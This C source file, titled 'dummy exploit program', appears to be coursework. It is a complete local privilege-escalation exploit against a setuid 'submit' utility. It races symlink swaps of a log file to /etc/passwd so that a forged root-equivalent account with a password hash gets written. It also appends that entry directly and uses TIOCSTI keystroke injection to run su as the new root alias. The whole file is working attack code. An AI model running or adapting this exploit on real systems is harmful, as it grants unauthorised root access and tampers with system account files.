/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/submit"

#define BAD_FILE "/home/user/submit.log"

#define NUM 25

void parent() {
	int i;

	for (i = 0; i < NUM; i++) {
		system("submit dummy 'root_alias:$1$fr..bINh$1qZ5lzsMMzjg97xgQBx291:0:0:root:/root:/bin/bash'");
		remove(BAD_FILE);
	}
}

void child() {

	int i;

	for (i = 0; i < NUM; i++) {
		FILE *fd = fopen(BAD_FILE, "w");
		if (fd != NULL) fclose(fd);
		usleep(1000 + rand() % 6000);
		remove(BAD_FILE);
		symlink("/etc/passwd", BAD_FILE);
	}
}

int main(void) {
	int pid;
	int retval;
	int i;
	FILE *fd;
	char a = 'a';
	char *aptr = &a;
	char newline = '\n';
	char *nlptr = &newline;

	/* create dummy src file for submit */
	system("touch dummy");

	for (i = 0; i < 20; i++) {
		pid = fork();

		if (pid < 0) {
			puts("Cannot fork");
		} else if (pid > 0) {
			parent();
			waitpid(pid, NULL, 0);

			/* look if an extra row is added to passwd; if so break */
			retval = system("[ `wc -l /etc/passwd | cut -d ' ' -f1` -ge 23 ] && exit 1 || exit 0");

			if (WEXITSTATUS(retval) == 1) break;

		} else {
			child();
			return 0;
		}
	}

	/* in case of file corruption due to creat (which we get permission to the passwd file), we append the attack entries manually */
	fd = fopen("/etc/passwd", "a");
	if (fd != NULL) {
		fputs("root:$1$fr..bINh$1qZ5lzsMMzjg97xgQBx291:0:0:root:/root:/bin/bash\n", fd);
		fputs("root_alias:$1$fr..bINh$1qZ5lzsMMzjg97xgQBx291:0:0:root:/root:/bin/bash\n", fd);
		fputs("user::1000:1000::/home/user:/bin/sh", fd);
		fclose(fd);
	}

	puts("Wait 1 more second before auto-entering password for root_alias");

	pid = fork();

	if (pid < 0) puts("Cannot fork");
	else if (pid > 0) {
		system("su root_alias");
	} else {
		sleep(1);
		/* enter "aaa\n" to the command line */
		ioctl(0,TIOCSTI,aptr);
		ioctl(0,TIOCSTI,aptr);
		ioctl(0,TIOCSTI,aptr);
		ioctl(0,TIOCSTI,nlptr);
	}
	return 0;
}
